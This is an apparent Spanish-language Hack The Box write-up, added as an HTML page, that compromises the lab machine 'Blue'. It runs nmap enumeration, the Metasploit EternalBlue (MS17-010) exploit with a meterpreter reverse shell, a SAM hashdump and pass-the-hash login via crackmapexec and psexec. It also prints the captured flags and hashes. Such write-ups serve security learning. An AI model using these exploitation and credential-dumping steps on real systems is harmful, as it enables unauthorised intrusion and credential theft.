@@ -1,0 +1,312 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Blue (easy) · MiguelRega7</title>
+<meta name="description" content="PortScan Enumeracion - Pues bueno mediante Nmap podemos aplicar un script para que nos reporte si es vulnerable a esta vulnerabilidad. - Con crackmapexec vemos que efectivamente es"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Blue (easy)</h1><div class="meta"><span>◷</span><time>2024-03-31</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">PortScan Enumeracion - Pues bueno mediante Nmap podemos aplicar un script para que nos reporte si es vulnerable a esta vulnerabilidad. - Con crackmapexec vemos que efectivamente es.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeracion">Enumeracion</a><a href="#shell-nt-authority-system">Shell NT Authority\System</a><a href="#user-txt">User.txt</a><a href="#root-txt">Root.txt</a><a href="#sam">SAM</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/52e077ae40899ab8b024afd51cb29b1c.png">
+</p>
+
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ping -c 1 10.10.10.40
+PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data.
+64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=96.1 ms
+
+--- 10.10.10.40 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 96.085/96.085/96.085/0.000 ms
+❯ whichSystem.py 10.10.10.40
+
+10.10.10.40 (ttl -&gt; 127): Windows
+</code></pre></div></div>
+<h2 id="portscan">PortScan</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 -oN targeted
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 17:01 CST
+Nmap scan report for 10.10.10.40
+Host is up (0.095s latency).
+
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2023-06-28T00:02:15+01:00
+| smb2-security-mode: 
+|   210: 
+|_    Message signing enabled but not required
+|_clock-skew: mean: -20m02s, deviation: 34m37s, median: -3s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time: 
+|   date: 2023-06-27T23:02:19
+|_  start_date: 2023-06-27T08:15:31
+</code></pre></div></div>
+<h2 id="enumeracion">Enumeracion</h2>
+<ul>
+<li>Pues bueno mediante <strong>Nmap</strong> podemos aplicar un script para que nos reporte si es vulnerable a esta vulnerabilidad.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nmap -p 445 --script &quot;vuln and safe&quot; 10.10.10.40
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 17:07 CST
+Nmap scan report for 10.10.10.40
+Host is up (0.096s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+Nmap done: 1 IP address (1 host up) scanned in 16.34 seconds
+</code></pre></div></div>
+<ul>
+<li>Con <strong>crackmapexec</strong> vemos que efectivamente estamos ante un <strong>Windows 7</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ crackmapexec smb 10.10.10.40
+SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
+</code></pre></div></div>
+<h2 id="shell-nt-authority-system">Shell NT Authority\System</h2>
+<ul>
+<li>Ahora nos vamos a ejecutar <strong>Metasploit</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ msfconsole
+                                                  
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+       =[ metasploit v6.3.5-dev                           ]
++ -- --=[ 2296 exploits - 1202 auxiliary - 410 post       ]
++ -- --=[ 965 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Set the current module's RHOSTS with 
+database values using hosts -R or services 
+-R
+Metasploit Documentation: https://docs.metasploit.com/
+
+[msf](Jobs:0 Agents:0) &gt;&gt; 
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a decirle el exploit que queremos usar.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">[msf](Jobs:0 Agents:0) &gt;&gt; use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) &gt;&gt;
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a pasarle los argumentos que nos pide que una de ellos es la <strong>ip</strong> de la maquina victima.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) &gt;&gt; show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/
+                                             using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Ser
+                                             ver 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server
+                                             2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, W
+                                             indows 7, Windows Embedded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.255.128  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) &gt;&gt;
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) &gt;&gt; set rhosts 10.10.10.40
+rhosts =&gt; 10.10.10.40
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) &gt;&gt; set lhost tun0
+lhost =&gt; 10.10.14.12
+[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) &gt;&gt; 
+</code></pre></div></div>
+<ul>
+<li>Ahora como esta vulnerabilidad te da privilegios maximos cuando corramos el exploit vamos a obtener una sesion de meterpreter.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) &gt;&gt; run
+
+[*] Started reverse TCP handler on 10.10.14.12:4444 
+[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.10.40:445 - The target is vulnerable.
+[*] 10.10.10.40:445 - Connecting to target for exploitation.
+[+] 10.10.10.40:445 - Connection established for exploitation.
+[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
+[*] 10.10.10.40:445 - Starting non-paged pool grooming
+[+] 10.10.10.40:445 - Sending SMBv2 buffers
+[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
+[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
+[*] 10.10.10.40:445 - Receiving response from exploit packet
+[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.10.40:445 - Sending egg to corrupted connection.
+[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
+[*] Sending stage (200774 bytes) to 10.10.10.40
+[*] Meterpreter session 1 opened (10.10.14.12:4444 -&gt; 10.10.10.40:49158) at 2023-06-27 17:16:47 -0600
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+(Meterpreter 1)(C:\Windows\system32) &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+(Meterpreter 1)(C:\Windows\system32) &gt;
+</code></pre></div></div>
+<ul>
+<li>Para obtener una <strong>cmd</strong> solo hacemos esto.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">(Meterpreter 1)(C:\Windows\system32) &gt; shell
+Process 2472 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;
+</code></pre></div></div>
+<h2 id="user-txt">User.txt</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\Users\haris\Desktop&gt;type user.txt
+type user.txt
+54c667afb359782634011adaab1de2e0
+
+C:\Users\haris\Desktop&gt;
+</code></pre></div></div>
+<h2 id="root-txt">Root.txt</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+012ecff6cf8ab60a656cd7810f7682d2
+
+C:\Users\Administrator\Desktop&gt;
+</code></pre></div></div>
+<h2 id="sam">SAM</h2>
+<ul>
+<li>Como estamos como el usuario con maximos privilegios podemos dumpear la <strong>SAM</strong> para obtener los <strong>hashes</strong> de todos los usuarios y usar <strong>psexec</strong> para conectarnos aplicando un <strong>passthehash</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">(Meterpreter 1)(C:\Windows\system32) &gt; hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::
+(Meterpreter 1)(C:\Windows\system32) &gt;
+</code></pre></div></div>
+<ul>
+<li>Ahora con <strong>crackmapexec</strong> podemos comprobar que es correcto el del usuario <strong>Administrator</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ crackmapexec smb 10.10.10.40 -u Administrator -H cdf51b162460b7d5bc898f493751a0cc
+SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
+SMB         10.10.10.40     445    HARIS-PC         [+] haris-PC\Administrator:cdf51b162460b7d5bc898f493751a0cc (Pwn3d!)
+</code></pre></div></div>
+<ul>
+<li>Ahora hay que agregar el nombre del dominio al <strong>/etc/hosts</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cat /etc/hosts | tail -n 1
+10.10.10.40 haris-PC.htb
+</code></pre></div></div>
+<ul>
+<li>Y listo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ psexec.py WORKGROUP/Administrator@10.10.10.40 -hashes :cdf51b162460b7d5bc898f493751a0cc
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.40.....
+[*] Found writable share ADMIN$
+[*] Uploading file zDRQfQfc.exe
+[*] Opening SVCManager on 10.10.10.40.....
+[*] Creating service AguJ on 10.10.10.40.....
+[*] Starting service AguJ.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+
+C:\Windows\system32&gt;
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
